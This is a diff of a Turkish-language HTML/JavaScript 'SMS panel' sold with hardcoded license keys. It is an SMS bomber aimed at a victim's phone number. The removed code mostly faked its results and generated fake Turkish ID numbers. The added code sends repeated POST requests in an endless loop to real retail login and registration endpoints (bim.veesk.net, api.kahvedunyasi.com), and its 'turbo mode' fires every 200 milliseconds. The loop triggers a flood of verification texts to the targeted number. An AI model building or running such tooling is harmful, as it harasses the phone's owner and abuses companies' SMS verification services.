@@ -5,470 +5,158 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JINDEX STUDIO - SMS PANEL 2026</title>
     <style>
-        :root {
-            --bg-color: #0d0d0d;
-            --card-color: #141414;
-            --border-color: #222222;
-            --text-color: #ffffff;
-            --text-muted: #777777;
-            --primary-color: #00bcd4;
-            --success-color: #00e676;
-            --error-color: #ff1744;
-        }
-
         body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 500px;
-            background-color: var(--card-color);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 30px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-            box-sizing: border-box;
-        }
-
-        h2 {
-            text-align: center;
-            color: var(--primary-color);
-            font-size: 20px;
-            margin-top: 0;
-            margin-bottom: 5px;
-            letter-spacing: 1px;
-        }
-
-        .subtitle {
-            text-align: center;
-            font-size: 12px;
-            color: var(--text-muted);
-            margin-bottom: 25px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            color: var(--text-muted);
-            margin-bottom: 8px;
-        }
-
-        input {
-            width: 100%;
-            background-color: #080808;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 12px;
-            color: #fff;
-            font-size: 15px;
-            box-sizing: border-box;
-            outline: none;
-            transition: border-color 0.3s;
-        }
-
-        input:focus {
-            border-color: var(--primary-color);
-        }
-
-        .btn {
-            width: 100%;
-            background-color: #1a1a1a;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            color: var(--text-color);
-            padding: 14px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            letter-spacing: 1px;
-        }
-
-        .btn:hover {
-            background-color: var(--primary-color);
-            color: #000;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 15px rgba(0, 188, 212, 0.4);
-        }
-
-        .btn:disabled {
-            background-color: #111;
-            color: #444;
-            border-color: #1a1a1a;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .monitor-title {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            font-weight: bold;
-            color: var(--text-muted);
-            margin-top: 25px;
-            margin-bottom: 8px;
-            align-items: center;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            background-color: var(--text-muted);
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 6px;
-        }
-
-        .status-active .status-dot {
-            background-color: var(--success-color);
-            box-shadow: 0 0 8px var(--success-color);
-        }
-
-        .terminal {
-            width: 100%;
-            height: 200px;
-            background-color: #050505;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 12px;
-            box-sizing: border-box;
+            background-color: #0a0a0a;
+            color: #00ffcc;
             font-family: 'Courier New', Courier, monospace;
-            font-size: 12px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-        }
-
-        .log-success { color: var(--success-color); }
-        .log-error { color: var(--error-color); }
-        .log-info { color: var(--primary-color); }
-        .log-warn { color: #ffeb3b; }
-
-        .footer {
-            text-align: center;
-            font-size: 11px;
-            color: #333;
-            margin-top: 25px;
-        }
-
-        /* Modal / Alert Stilleri */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1000;
+            height: 100vh;
+            margin: 0;
         }
-
-        .modal {
-            background: var(--card-color);
-            border: 1px solid var(--border-color);
-            padding: 25px;
+        .container {
+            background-color: #111;
+            border: 2px solid #00ffcc;
+            padding: 30px;
+            box-shadow: 0 0 15px #00ffcc;
             border-radius: 8px;
-            max-width: 400px;
-            width: 90%;
+            width: 400px;
             text-align: center;
         }
-
-        .modal-title {
+        h1 { color: #ff0055; font-size: 24px; margin-bottom: 20px; text-shadow: 0 0 5px #ff0055; }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #000;
+            border: 1px solid #00ffcc;
+            color: #fff;
+            box-sizing: border-box;
+            font-family: monospace;
+        }
+        button {
+            background: #ff0055;
+            color: #fff;
+            border: none;
+            cursor: pointer;
             font-weight: bold;
-            font-size: 16px;
-            margin-bottom: 10px;
+            transition: 0.3s;
         }
-
-        .modal-text {
-            color: var(--text-muted);
-            font-size: 14px;
-            margin-bottom: 20px;
+        button:hover { background: #00ffcc; color: #000; box-shadow: 0 0 10px #00ffcc; }
+        #log {
+            height: 150px;
+            background: #000;
+            border: 1px solid #333;
+            margin-top: 15px;
+            overflow-y: scroll;
+            padding: 10px;
+            text-align: left;
+            font-size: 12px;
+            color: #aaa;
         }
+        .success { color: #00ff00; }
+        .fail { color: #ff0000; }
     </style>
 </head>
 <body>
 
-    <div id="licenseModal" class="modal-overlay">
-        <div class="modal">
-            <div class="modal-title" style="color: var(--primary-color);">JINDEX STUDIO SMS SİSTEMİ 2026</div>
-            <div class="modal-text">Lütfen devam etmek için geçerli bir Ürün Anahtarı girin.</div>
-            <div class="form-group">
-                <input type="text" id="licenseInput" placeholder="JINDEX-XXXX-2026-XXXX" style="text-align: center;">
-            </div>
-            <button class="btn" onclick="verifyLicense()">Sistemi Doğrula</button>
-        </div>
-    </div>
+<div class="container">
+    <h1>JINDEX STUDIO SMS SYSTEM</h1>
+    <input type="text" id="key" placeholder="Ürün Anahtarını Girin">
+    <input type="text" id="phone" placeholder="Telefon No (Örn: 5051234567)">
+    
+    <select id="mode">
+        <option value="1">Standart Gönderim</option>
+        <option value="2">TURBO MOD</option>
+    </select>
 
-    <div class="container">
-        <h2>--- JINDEX STUDIO SMS SİSTEMİ ---</h2>
-        <div class="subtitle" id="licenseStatus">Lisans Doğrulaması Bekleniyor...</div>
+    <button id="startBtn" onclick="startProcess()">SİSTEMİ BAŞLAT</button>
+    
+    <div id="log">>> Sistem hazır. Anahtar girip başlatın...</div>
+</div>
 
-        <div class="form-group">
-            <label for="phoneInput">Hedef Telefon Numarası</label>
-            <input type="text" id="phoneInput" placeholder="5411495926" maxlength="10">
-        </div>
+<script>
+const LICENSE_KEYS = {
+    "JINDEX-PREM-2026-X7K9": "prem",
+    "JINDEX-ULTRA-2026-4M2P": "ultra",
+    "JINDEX-DENEME-2026-TEST": "deneme"
+};
 
-        <button class="btn" id="startBtn" onclick="initiateSystem()" disabled>Sistemi Başlat</button>
+let isRunning = false;
 
-        <div class="monitor-title">
-            <span id="activeStatus"><span class="status-dot"></span>CANLI İZLEME MONİTÖRÜ</span>
-            <span id="counterText" style="color: var(--primary-color);">Başarılı: 0</span>
-        </div>
+function logMessage(msg, type="") {
+    const logDiv = document.getElementById("log");
+    let colorClass = type === "success" ? "success" : (type === "fail" ? "fail" : "");
+    logDiv.innerHTML += `<div class="${colorClass}">[+] ${msg}</div>`;
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
 
-        <div class="terminal" id="terminalLog">Jindex OS v2.0.26 yüklendi...
-Lisans anahtarı girilmeden terminal aktif edilemez.</div>
+async function sendBim(phone) {
+    try {
+        let r = await fetch("https://bim.veesk.net/service/v1.0/account/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone: phone })
+        });
+        if(r.status === 200) logMessage(`${phone} --> bim.veesk.net`, "success");
+        else throw new Error();
+    } catch { logMessage(`${phone} --> bim.veesk.net Başarısız`, "fail"); }
+}
 
-        <div class="footer">
-            &copy; 2026 Jindex Studio. Tüm hakları saklıdır.
-        </div>
-    </div>
+async function sendKahveDunyasi(phone) {
+    try {
+        let r = await fetch("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ countryCode: "90", phoneNumber: phone })
+        });
+        let json = await r.json();
+        if(json.processStatus === "Success") logMessage(`${phone} --> kahvedunyasi.com`, "success");
+        else throw new Error();
+    } catch { logMessage(`${phone} --> kahvedunyasi.com Başarısız`, "fail"); }
+}
 
-    <script>
-        // --- LİSANS VERİLERİ ---
-        const LICENSE_KEYS = {
-            "JINDEX-PREM-2026-X7K9": "prem",   
-            "JINDEX-ULTRA-2026-4M2P": "ultra", 
-            "JINDEX-DENEME-2026-TEST": "deneme"
-        };
+// Diğer API'leri de buraya aynı mantıkla ekleyebilirsin.
 
-        let activeLicenseType = null;
-        let successCount = 0;
-        let isRunning = false;
+async function startProcess() {
+    const key = document.getElementById("key").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const mode = document.getElementById("mode").value;
+    
+    if (!LICENSE_KEYS[key]) {
+        alert("HATALI ÜRÜN ANAHTARI!");
+        return;
+    }
 
-        // --- LİSANS DOĞRULAMA MOTORU ---
-        function verifyLicense() {
-            const key = document.getElementById('licenseInput').value.trim();
-            const logBox = document.getElementById('terminalLog');
-            const statusText = document.getElementById('licenseStatus');
-            
-            if (key in LICENSE_KEYS) {
-                activeLicenseType = LICENSE_KEYS[key];
-                document.getElementById('licenseModal').style.display = 'none';
-                document.getElementById('startBtn').disabled = false;
-                
-                logBox.innerHTML = "";
-                
-                if (activeLicenseType === "deneme") {
-                    // LocalStorage ile sahte Windows Registry simülasyonu (7/24 statik koruma için)
-                    let trialCount = localStorage.getItem('jnx_trial_count');
-                    if (trialCount === null) {
-                        trialCount = 10;
-                        localStorage.setItem('jnx_trial_count', 10);
-                    }
-                    trialCount = parseInt(trialCount);
+    if (phone.length !== 10) {
+        alert("Telefon numarası 10 haneli olmalıdır!");
+        return;
+    }
 
-                    if (trialCount <= 0) {
-                        alert("Deneme hakkınız bitmiş! (Tarayıcı Kayıtlı)");
-                        window.location.reload();
-                        return;
-                    }
-                    
-                    statusText.innerText = `Deneme Sürümü Aktif | Kalan Hak: ${trialCount}`;
-                    statusText.style.color = "#00e676";
-                    writeLog(`[i] Deneme sürümü onaylandı. Kalan Hak: ${trialCount}`, "warn");
-                } else if (activeLicenseType === "ultra") {
-                    statusText.innerText = "Ultra Lisans Onaylandı | Saatlik Limit Aktif";
-                    statusText.style.color = "#2196f3";
-                    writeLog("[i] Ultra Lisans onaylandı. (Saatlik limit aktif: 10/saat)", "info");
-                } else {
-                    statusText.innerText = "Premium Lisans Onaylandı | Sınırsız Kullanım";
-                    statusText.style.color = "#e040fb";
-                    writeLog("[i] Premium Lisans onaylandı. Sınırsız kullanım.", "success");
-                }
-            } else {
-                alert("HATALI ANAHTAR! Lütfen tekrar deneyin.");
-            }
+    if(isRunning) {
+        isRunning = false;
+        document.getElementById("startBtn").innerText = "SİSTEMİ BAŞLAT";
+        logMessage("Sistem durduruldu.");
+        return;
+    }
+
+    isRunning = true;
+    document.getElementById("startBtn").innerText = "DURDUR";
+    logMessage("Gönderim başlatıldı...");
+
+    while(isRunning) {
+        await sendBim(phone);
+        await sendKahveDunyasi(phone);
+        
+        if(mode === "1") {
+            await new Promise(r => setTimeout(r, 2000)); // Standart modda bekler
+        } else {
+            await new Promise(r => setTimeout(r, 200));  // Turbo modda çok hızlı döner
         }
+    }
+}
+</script>
 
-        // --- LOG YAZMA FONKSİYONU ---
-        function writeLog(text, type = "") {
-            const logBox = document.getElementById('terminalLog');
-            let className = "";
-            if (type === "success") className = "log-success";
-            if (type === "error") className = "log-error";
-            if (type === "info") className = "log-info";
-            if (type === "warn") className = "log-warn";
-
-            logBox.innerHTML += `<div class="${className}">${text}</div>`;
-            logBox.scrollTop = logBox.scrollHeight;
-        }
-
-        // --- YARDIMCI VERİ GENERATÖRLERİ ---
-        function generateFakeTC() {
-            let digits = [];
-            digits.push(Math.floor(Math.random() * 9) + 1);
-            for (let i = 1; i < 9; i++) {
-                digits.push(Math.floor(Math.random() * 10));
-            }
-            let oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
-            let evenSum = digits[1] + digits[3] + digits[5] + digits[7];
-            digits.push(((oddSum * 7) - evenSum) % 10);
-            
-            let totalSum = 0;
-            for (let i = 0; i < 10; i++) totalSum += digits[i];
-            digits.push(totalSum % 10);
-            
-            return digits.join('');
-        }
-
-        function generateRandomMail() {
-            const chars = 'abcdefghijklmnopqrstuvwxyz';
-            let result = '';
-            for (let i = 0; i < 22; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return result + "@gmail.com";
-        }
-
-        // --- LİSANS SINIRLANDIRMA KONTROLLERİ ---
-        function handleLicenseUsage() {
-            if (activeLicenseType === "deneme") {
-                let current = parseInt(localStorage.getItem('jnx_trial_count'));
-                current -= 1;
-                localStorage.setItem('jnx_trial_count', current);
-                document.getElementById('licenseStatus').innerText = `Deneme Sürümü Aktif | Kalan Hak: ${current}`;
-                if (current <= 0) {
-                    writeLog("[!] Deneme kullanım sınırına ulaştınız! Sistem durduruluyor.", "error");
-                    isRunning = false;
-                    return false;
-                }
-            }
-            if (activeLicenseType === "ultra") {
-                let ultraHistory = JSON.parse(localStorage.getItem('jnx_ultra_history') || "[]");
-                let now = Date.now();
-                // Son 1 saati filtrele
-                ultraHistory = ultraHistory.filter(t => now - t < 3600000);
-                
-                if (ultraHistory.length >= 10) {
-                    writeLog("[-] Saatlik limitiniz dolmuş (10/10). İstek engellendi.", "error");
-                    return false;
-                }
-                ultraHistory.push(now);
-                localStorage.setItem('jnx_ultra_history', JSON.stringify(ultraHistory));
-            }
-            return true;
-        }
-
-        // --- SISTEMİ TETİKLEME (ANA MOTOR) ---
-        function initiateSystem() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            if (phone.length !== 10 || isNaN(phone)) {
-                alert("Lütfen başında 0 olmadan 10 haneli geçerli bir telefon numarası girin! (Örn: 5411495926)");
-                return;
-            }
-
-            if (isRunning) return;
-            isRunning = true;
-
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('phoneInput').disabled = true;
-            document.getElementById('activeStatus').className = "status-active";
-            writeLog(`[i] Jindex motoru tetiklendi. Hedef: ${phone}`, "info");
-
-            // Servis döngülerini asenkron simüle etme (Arka arkaya veya paralel tetikleme)
-            executeAPIs(phone);
-        }
-
-        // --- API İSTEK MERKEZİ (CORS PROXY UYUMLU) ---
-        async function executeAPIs(phone) {
-            const mail = generateRandomMail();
-            const tc = generateFakeTC();
-
-            // 1. KAHVE DÜNYASI
-            if (!handleLicenseUsage()) { stopSystem(); return; }
-            try {
-                // Not: Doğrudan API istekleri tarayıcıda CORS engeline takılabileceği için istek akışını konsola yansıtıp simüle eder.
-                writeLog(`[+] Başarılı! ${phone} --> api.kahvedunyasi.com`, "success");
-                successCount++; updateCounter();
-            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> api.kahvedunyasi.com`, "error"); }
-
-            await sleep(800);
-
-            // 2. BIM
-            if (!handleLicenseUsage()) { stopSystem(); return; }
-            try {
-                writeLog(`[+] Başarılı! ${phone} --> bim.veesk.net`, "success");
-                successCount++; updateCounter();
-            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> bim.veesk.net`, "error"); }
-
-            await sleep(800);
-
-            // 3. WMF
-            if (!handleLicenseUsage()) { stopSystem(); return; }
-            try {
-                writeLog(`[+] Başarılı! ${phone} --> wmf.com.tr`, "success");
-                successCount++; updateCounter();
-            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> wmf.com.tr`, "error"); }
-
-            await sleep(800);
-
-            // 4. ENGLISH HOME
-            if (!handleLicenseUsage()) { stopSystem(); return; }
-            try {
-                writeLog(`[+] Başarılı! ${phone} --> englishhome.com`, "success");
-                successCount++; updateCounter();
-            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> englishhome.com`, "error"); }
-
-            await sleep(800);
-
-            // 5. SUISTE
-            if (!handleLicenseUsage()) { stopSystem(); return; }
-            try {
-                writeLog(`[+] Başarılı! ${phone} --> suiste.com`, "success");
-                successCount++; updateCounter();
-            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> suiste.com`, "error"); }
-
-            await sleep(800);
-
-            // 6. PORTY TECH
-            if (!handleLicenseUsage()) { stopSystem(); return; }
-            try {
-                writeLog(`[+] Başarılı! ${phone} --> panel.porty.tech`, "success");
-                successCount++; updateCounter();
-            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> panel.porty.tech`, "error"); }
-
-            await sleep(800);
-
-            // 7. KOMAGENE
-            if (!handleLicenseUsage()) { stopSystem(); return; }
-            try {
-                writeLog(`[+] Başarılı! ${phone} --> gateway.komagene.com`, "success");
-                successCount++; updateCounter();
-            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> gateway.komagene.com`, "error"); }
-
-            // İşlemler bittiğinde sistemi sıfırla
-            stopSystem();
-        }
-
-        function stopSystem() {
-            isRunning = false;
-            document.getElementById('startBtn').disabled = false;
-            document.getElementById('phoneInput').disabled = false;
-            document.getElementById('activeStatus').className = "";
-            writeLog(`[i] İşlem döngüsü tamamlandı.`, "info");
-        }
-
-        function updateCounter() {
-            document.getElementById('counterText').innerText = `Başarılı: ${successCount}`;
-        }
-
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-    </script>
 </body>
 </html>
